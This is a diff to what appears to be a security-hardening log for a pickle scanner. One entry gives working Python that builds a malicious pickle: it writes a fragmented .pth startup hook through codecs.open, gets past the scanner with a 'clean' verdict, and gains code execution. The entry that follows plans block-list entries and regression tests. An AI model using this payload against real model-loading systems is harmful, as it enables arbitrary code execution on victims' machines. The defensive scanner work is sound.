@@ -6098,3 +6098,154 @@ Blocking plan:
 Performance note: seven exact entries in the existing sorted policy table and
 no logging formatter simulation, handler state tracking, path argument
 inspection, or broad `logging` wildcard block.
+
+## Turn 113 - `codecs.open` startup-hook write gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using `codecs.open` as a clean
+file-opening alias and `codecs.StreamReaderWriter.write` as a clean arbitrary
+text writer.
+
+Candidate payload:
+
+- Call `codecs.open(path, "w", "utf-8")` during unpickling. This opens an
+  attacker-selected filesystem path internally without referencing
+  `builtins.open`, `io.open`, `_io.open`, or `pathlib.Path.open`.
+- Call `codecs.StreamReaderWriter.write(file, content)` during unpickling.
+- For startup-hook execution, keep the file object memoized and call
+  `write()` four times with fragments: `"im"`,
+  `"port pathlib;pathlib.Path("`, `repr(marker_path)`, and
+  `").write_text('owned-by-codecs-pth')\n"`. CPython closes and flushes the
+  memoized stream when `pickle.loads()` releases the unpickler memo.
+- Normal Python site processing later executes the `.pth` line and writes the
+  marker file.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return text(module) + text(name) + b"\x93"
+
+
+pth_path = Path("/tmp/ma_codecs_exec.pth")
+marker = Path("/tmp/ma_codecs_pth_marker")
+fragments = [
+    "im",
+    "port pathlib;pathlib.Path(",
+    repr(str(marker)),
+    ").write_text('owned-by-codecs-pth')\n",
+]
+
+parts = [b"\x80\x04"]
+parts += [
+    sg("codecs", "open"),
+    text(str(pth_path)),
+    text("w"),
+    text("utf-8"),
+    b"\x87R\x94",
+]
+for fragment in fragments[:-1]:
+    parts += [
+        sg("codecs", "StreamReaderWriter.write"),
+        b"h\x00",
+        text(fragment),
+        b"\x86R0",
+    ]
+parts += [
+    sg("codecs", "StreamReaderWriter.write"),
+    b"h\x00",
+    text(fragments[-1]),
+    b"\x86R.",
+]
+payload = b"".join(parts)
+```
+
+Proof on CPython 3.12.12:
+
+- Simple arbitrary write payload:
+  - `len=120`, `status=complete`, `verdict=clean`, `is_clean=True`,
+    `findings=[]`, `notices=[]`, `errors=[]`
+  - Coverage: `bytes_scanned=120`, `bytes_total=120`, `opcode_count=18`,
+    `raw_scan_complete=True`, `opcode_scan_complete=True`
+  - Scanner import references: `codecs.open` and
+    `codecs.StreamReaderWriter.write`, both with `is_dangerous=False`
+  - Before unpickle: marker does not exist
+  - After `pickle.loads(payload)`: marker exists and contains
+    `owned-by-codecs-open`
+- Fragmented `.pth` startup-hook payload:
+  - `len=448`, `status=complete`, `verdict=clean`, `is_clean=True`,
+    `findings=[]`, `notices=[]`, `errors=[]`
+  - Coverage: `bytes_scanned=448`, `bytes_total=448`, `opcode_count=42`,
+    `raw_scan_complete=True`, `opcode_scan_complete=True`
+  - Scanner import references: `codecs.open` and four
+    `codecs.StreamReaderWriter.write` calls, all with `is_dangerous=False`
+  - String heuristic matches: `[]`
+  - Before unpickle: neither the `.pth` file nor marker exists
+  - After `pickle.loads(payload)`: the `.pth` file exists and contains
+    `import pathlib;pathlib.Path('/tmp/.../ma_codecs_pth_marker').write_text('owned-by-codecs-pth')`;
+    the marker does not exist yet
+  - After normal `site.addsitedir(tmp_dir)`: the marker exists and contains
+    `owned-by-codecs-pth`
+
+RCE mechanism:
+
+- `codecs.open()` is a stdlib alias that opens attacker-selected paths through
+  the codec layer, bypassing exact policy entries for `builtins.open`,
+  `io.open`, `_io.open`, and `pathlib.Path.open`.
+- `codecs.StreamReaderWriter.write()` writes attacker-controlled text to that
+  stream before `pickle.loads()` returns. CPython's refcounting closes and
+  flushes the memoized stream when the unpickler releases its memo.
+- Splitting the executable `.pth` line across multiple `write()` calls avoids
+  the scanner's literal `import` statement heuristic while producing one
+  executable line on disk.
+- In a model-loading process, writing `.pth`, `sitecustomize.py`, package
+  source, shell config, or service config under a writable loader path can turn
+  the arbitrary write into code execution.
+
+Why the scanner missed it:
+
+- `codecs` is not a wildcard-dangerous module.
+- The policy blocks `codecs.decode` and `codecs.encode`, but not
+  `codecs.open` or `codecs.StreamReaderWriter.write`.
+- The payload uses no blocked file API globals and no suspicious magic-method
+  strings.
+- The executable startup-hook line is assembled on disk across multiple clean
+  writes, so no individual pickle string contains an import statement.
+
+Performance note: the focused next block should add exact dangerous-global
+entries for `codecs.open` and `codecs.StreamReaderWriter.write`. This keeps
+the hot path to sorted table lookups and avoids codec stream state tracking,
+argument-mode inspection, path modeling, or broad `codecs` wildcard blocking.
+
+## Turn 114 - Block `codecs.open` stream writes
+
+Blocking plan:
+
+- Add exact dangerous-global entries for `codecs.open` and
+  `codecs.StreamReaderWriter.write`.
+- Leave existing `codecs.decode` and `codecs.encode` behavior unchanged. Those
+  were already blocked for data-transformation abuse, while this turn targets
+  codec-backed filesystem writes.
+- Add a CPython oracle regression for the simple `codecs.open(..., "w",
+  "utf-8")` plus `StreamReaderWriter.write()` arbitrary-write payload. The
+  constructor-only control is now malicious because opening a write-mode codec
+  stream creates attacker-selected files as a side effect.
+- Add a focused fragmented `.pth` regression. The test verifies the scanner
+  marks the payload malicious through the codec globals, then verifies
+  `pickle.loads()` writes the fragmented startup hook and normal
+  `site.addsitedir()` executes it.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: two exact entries in the existing sorted policy table and no
+codec-stream state tracking, file mode inspection, path modeling, or broad
+`codecs` wildcard block.
